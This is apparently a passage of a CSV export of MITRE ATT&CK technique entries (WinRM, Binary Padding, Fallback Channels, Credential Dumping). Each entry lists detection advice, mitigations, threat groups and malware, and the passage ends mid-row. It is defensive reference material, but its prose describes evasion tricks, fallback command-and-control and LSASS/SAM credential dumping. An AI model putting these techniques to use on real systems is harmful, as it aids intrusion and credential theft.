,Analytic Details,Bypass,CAPEC ID,Contributor,Data Source,Description,Group,Group Alias,Group ID,Mitigation,Platform,Requires Permissions,Requires System,Software,Tactic,Technique ID,Technique Name,URL
0,"['Monitor use of WinRM within an environment by tracking service execution. If it is not normally used or is disabled, then this may be an indicator of suspicious behavior. Monitor processes created and actions taken by the WinRM process or a WinRM invoked script to correlate it with other related events.']",[],[],[],"['File monitoring', 'Authentication logs', 'Netflow/Enclave netflow', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0154|Cobalt Strike]] can use <code>WinRM</code> to execute a payload on a remote host.[[CiteRef::cobaltstrike manual]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Disable the WinRM service. If the service is necessary, lock down critical enclaves with separate WinRM infrastructure, accounts, and permissions. Follow WinRM best practices on configuration of authentication methods and use of host firewalls to restrict WinRM access to allow communication only to/from specific devices.[[CiteRef::NSA Spotting]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",['WinRM listener turned on and configured on remote system'],Software: Cobalt Strike,"['Execution', 'Lateral Movement']",['Technique/T1028'],['Windows Remote Management'],https://attack.mitre.org/wiki/Technique/T1028
1,"['Monitor use of WinRM within an environment by tracking service execution. If it is not normally used or is disabled, then this may be an indicator of suspicious behavior. Monitor processes created and actions taken by the WinRM process or a WinRM invoked script to correlate it with other related events.']",[],[],[],"['File monitoring', 'Authentication logs', 'Netflow/Enclave netflow', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0027|Threat Group-3390]] has used WinRM to enable remote execution.[[CiteRef::SecureWorks BRONZE UNION June 2017]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Disable the WinRM service. If the service is necessary, lock down critical enclaves with separate WinRM infrastructure, accounts, and permissions. Follow WinRM best practices on configuration of authentication methods and use of host firewalls to restrict WinRM access to allow communication only to/from specific devices.[[CiteRef::NSA Spotting]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",['WinRM listener turned on and configured on remote system'],[],"['Execution', 'Lateral Movement']",['Technique/T1028'],['Windows Remote Management'],https://attack.mitre.org/wiki/Technique/T1028
2,"['Depending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool. \n\nWhen executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information [[Discovery]] or [[Lateral Movement]], which could be used as event indicators that point to the source file.']","['Anti-virus', 'Signature-based detection']",['572'],[],[],['[[Group/G0002|Moafee]] has been known to employ binary padding.[[CiteRef::Haq 2014]]'],['Moafee'],['Moafee'],['G0002'],"['Identify potentially malicious software that may be executed from a padded or otherwise obfuscated binary, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense Evasion'],['Technique/T1009'],['Binary Padding'],https://attack.mitre.org/wiki/Technique/T1009
3,"['Depending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool. \n\nWhen executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information [[Discovery]] or [[Lateral Movement]], which could be used as event indicators that point to the source file.']","['Anti-virus', 'Signature-based detection']",['572'],[],[],['A version of [[Software/S0117|XTunnel]] introduced in July 2015 inserted junk code into the binary in a likely attempt to obfuscate it and bypass security products.[[CiteRef::ESET Sednit Part 2]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify potentially malicious software that may be executed from a padded or otherwise obfuscated binary, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: XTunnel, X-Tunnel, XAPS",['Defense Evasion'],['Technique/T1009'],['Binary Padding'],https://attack.mitre.org/wiki/Technique/T1009
4,"['Depending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool. \n\nWhen executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information [[Discovery]] or [[Lateral Movement]], which could be used as event indicators that point to the source file.']","['Anti-virus', 'Signature-based detection']",['572'],[],[],['[[Software/S0137|CORESHELL]] contains unused machine instructions in a likely attempt to hinder analysis.[[CiteRef::FireEye APT28]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify potentially malicious software that may be executed from a padded or otherwise obfuscated binary, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: CORESHELL, SOURFACE",['Defense Evasion'],['Technique/T1009'],['Binary Padding'],https://attack.mitre.org/wiki/Technique/T1009
5,"['Depending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool. \n\nWhen executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information [[Discovery]] or [[Lateral Movement]], which could be used as event indicators that point to the source file.']","['Anti-virus', 'Signature-based detection']",['572'],[],[],['A variant of [[Software/S0082|Emissary]] appends junk data to the end of its DLL file to create a large file that may exceed the maximum size that anti-virus programs can scan.[[CiteRef::Emissary Trojan Feb 2016]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"['Identify potentially malicious software that may be executed from a padded or otherwise obfuscated binary, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Emissary,['Defense Evasion'],['Technique/T1009'],['Binary Padding'],https://attack.mitre.org/wiki/Technique/T1009
6,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring']",['[[Software/S0021|Derusbi]] uses a backup communication method with an HTTP beacon.[[CiteRef::Fidelis Turbo]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Derusbi,['Command and Control'],['Technique/T1008'],['Fallback Channels'],https://attack.mitre.org/wiki/Technique/T1008
7,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring']",['[[Software/S0021|Derusbi]] uses a backup communication method with an HTTP beacon.[[CiteRef::Fidelis Turbo]]'],['Axiom'],"['Axiom', 'Group 72']",['G0001'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Derusbi,['Command and Control'],['Technique/T1008'],['Fallback Channels'],https://attack.mitre.org/wiki/Technique/T1008
8,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring']",['[[Software/S0017|BISCUIT]] malware contains a secondary fallback command and control server that is contacted after the primary command and control server.[[CiteRef::Mandiant APT1 Appendix]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: BISCUIT,['Command and Control'],['Technique/T1008'],['Fallback Channels'],https://attack.mitre.org/wiki/Technique/T1008
9,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring']",['[[Software/S0023|CHOPSTICK]] can switch to a new C2 channel if the current one is broken.[[CiteRef::ESET Sednit Part 2]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: CHOPSTICK, SPLM, ...",['Command and Control'],['Technique/T1008'],['Fallback Channels'],https://attack.mitre.org/wiki/Technique/T1008
10,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring']","['[[Software/S0044|JHUHUGIT]] tests if it can reach its C2 server by first attempting a direct connection, and if it fails, obtaining proxy settings and sending the connection through a proxy, and finally injecting code into a running browser if the proxy method fails.[[CiteRef::ESET Sednit Part 1]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: JHUHUGIT, Seduploader, ...",['Command and Control'],['Technique/T1008'],['Fallback Channels'],https://attack.mitre.org/wiki/Technique/T1008
11,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring']",['The C2 server used by [[Software/S0117|XTunnel]] provides a port number to the victim to use as a fallback in case the connection closes on the currently used port.[[CiteRef::ESET Sednit Part 2]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: XTunnel, X-Tunnel, XAPS",['Command and Control'],['Technique/T1008'],['Fallback Channels'],https://attack.mitre.org/wiki/Technique/T1008
12,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring']",['[[Software/S0089|BlackEnergy]] has the capability to communicate over a backup channel via plus.google.com.[[CiteRef::Securelist BlackEnergy Nov 2014]]'],['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: BlackEnergy, Black Energy",['Command and Control'],['Technique/T1008'],['Fallback Channels'],https://attack.mitre.org/wiki/Technique/T1008
13,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring']","['[[Software/S0034|NETEAGLE]] will attempt to detect if the infected host is configured to a proxy. If so, [[Software/S0034|NETEAGLE]] will send beacons via an HTTP POST request; otherwise it will send beacons via UDP/6000.[[CiteRef::FireEye APT30]]']",['APT30'],['APT30'],['G0013'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: NETEAGLE,['Command and Control'],['Technique/T1008'],['Fallback Channels'],https://attack.mitre.org/wiki/Technique/T1008
14,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring']",['[[Software/S0058|SslMM]] has a hard-coded primary and backup C2 string.[[CiteRef::Baumgartner Naikon 2015]]'],['Naikon'],['Naikon'],['G0019'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: SslMM,['Command and Control'],['Technique/T1008'],['Fallback Channels'],https://attack.mitre.org/wiki/Technique/T1008
15,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring']",['[[Software/S0059|WinMM]] is usually configured with primary and backup domains for C2 communications.[[CiteRef::Baumgartner Naikon 2015]]'],['Naikon'],['Naikon'],['G0019'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: WinMM,['Command and Control'],['Technique/T1008'],['Fallback Channels'],https://attack.mitre.org/wiki/Technique/T1008
16,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring']","['[[Software/S0084|Mis-Type]] first attempts to use a Base64-encoded network protocol over a raw TCP socket for C2, and if that method fails, falls back to a secondary HTTP-based protocol to communicate to an alternate C2 server.[[CiteRef::Cylance Dust Storm]]']",['Dust Storm'],['Dust Storm'],['G0031'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Mis-Type,['Command and Control'],['Technique/T1008'],['Fallback Channels'],https://attack.mitre.org/wiki/Technique/T1008
17,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring']","['[[Software/S0085|S-Type]] primarily uses port 80 for C2, but falls back to ports 443 or 8080 if initial communication fails.[[CiteRef::Cylance Dust Storm]]']",['Dust Storm'],['Dust Storm'],['G0031'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: S-Type,['Command and Control'],['Technique/T1008'],['Fallback Channels'],https://attack.mitre.org/wiki/Technique/T1008
18,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring']",['[[Software/S0051|MiniDuke]] uses Google Search to identify C2 servers if its primary C2 method via Twitter is not working.[[CiteRef::Securelist MiniDuke Feb 2013]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: MiniDuke,['Command and Control'],['Technique/T1008'],['Fallback Channels'],https://attack.mitre.org/wiki/Technique/T1008
19,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring']","['[[Group/G0032|Lazarus Group]] malware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random, and if the transmission fails, chooses a new C2 server to attempt the transmission again.[[CiteRef::Novetta Blockbuster RATs]]']",['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1008'],['Fallback Channels'],https://attack.mitre.org/wiki/Technique/T1008
20,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring']","['[[Software/S0062|DustySky]] has two hard-coded domains for C2 servers; if the first does not respond, it will try the second.[[CiteRef::DustySky]]']",['Molerats'],"['Molerats', 'Gaza cybergang', 'Operation Molerats']",['G0021'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: DustySky, NeD Worm",['Command and Control'],['Technique/T1008'],['Fallback Channels'],https://attack.mitre.org/wiki/Technique/T1008
21,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process 